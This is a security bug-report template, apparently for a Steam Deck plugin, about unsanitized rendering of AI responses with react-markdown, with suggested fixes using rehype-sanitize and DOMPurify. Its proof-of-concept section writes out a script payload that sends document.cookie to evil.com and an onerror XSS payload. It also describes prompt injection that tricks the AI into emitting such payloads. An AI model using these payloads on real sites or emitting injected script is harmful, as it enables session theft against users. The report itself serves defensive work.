---
name: '🔴 Critical: Markdown XSS Vulnerability'
about: 'Report a critical injection/XSS vulnerability'
title: '[CRITICAL] Markdown rendering may allow XSS attacks'
labels: 'bug, critical, security, xss'
assignees: ''
---

## 🔴 Critical Bug Report

### Bug Description

**Markdown XSS vulnerability** - The `AIAssistant.tsx` component renders AI responses using `react-markdown` without sanitization, which could allow XSS attacks if a malicious AI response contains crafted JavaScript payloads.

### Location

`src/components/AIAssistant.tsx`, lines ~195-205:
```tsx
<div style={{...}}>
  {msg.role === "ai" ? (
    <ReactMarkdown>{msg.text}</ReactMarkdown>  // ❌ No sanitization
  ) : (
    msg.text
  )}
</div>
```

### Impact

- **Severity**: Critical
- **CVSS Estimate**: 8.1 (High)
- **Attack Vector**: Remote (via malicious AI response)
- **Confidentiality Impact**: Full DOM access, session hijacking, keylogging

### Attack Scenarios

1. **AI Prompt Injection**: A user or compromised game context could inject a malicious prompt that tricks the AI into returning XSS payloads.

2. **Model Compromise**: If the Gemini API is compromised or a different model is used, it could return malicious content.

3. **Man-in-the-Middle**: If HTTPS is not properly validated, a MITM attack could inject malicious JavaScript.

### Proof of Concept (for testing)

A malicious AI response could contain:
```markdown
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

Or via image onerror:
```markdown
![x](x" onerror="alert('XSS')")
```

### Expected Behavior

AI-generated content should be treated as untrusted and sanitized before rendering.

### Suggested Fix

Use `remark-gfm` with `rehype-sanitize` or similar:

```bash
npm install rehype-sanitize remark-gfm
```

```tsx
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';

const sanitizeSchema = {
  ...defaultSchema,
  // Allow specific dangerous tags but strip scripts
  tagNames: [...defaultSchema.tagNames, 'img', 'a'],
  // More restrictive attributes
  attributes: {
    ...defaultSchema.attributes,
    '*': [...(defaultSchema.attributes?.['*'] || []), 'className'],
    a: [...(defaultSchema.attributes?.['a'] || []), 'target', 'rel'],
  },
};

// Usage:
<ReactMarkdown 
  remarkPlugins={[remarkGfm]}
  rehypePlugins={[rehypeSanitize]}
>
  {msg.text}
</ReactMarkdown>
```

### Alternative: DOMPurify

```bash
npm install dompurify
```

```tsx
import DOMPurify from 'dompurify';

// Sanitize before rendering
const sanitizedMarkdown = DOMPurify.sanitize(msg.text);

<div>
  <ReactMarkdown>{sanitizedMarkdown}</ReactMarkdown>
</div>
```

### Security Recommendations

1. **Defense in Depth**: Combine multiple sanitization layers
2. **Content Security Policy**: Add CSP headers to restrict inline scripts
3. **Input Validation**: Validate prompt context doesn't contain injection attempts
4. **AI Prompt Hardening**: Add system prompts that refuse to generate code/content

---

### Environment

- Steam Deck OS: <!-- your version -->
- Plugin version: <!-- e.g., 0.0.1 -->
- Decky Loader version: <!-- if known -->
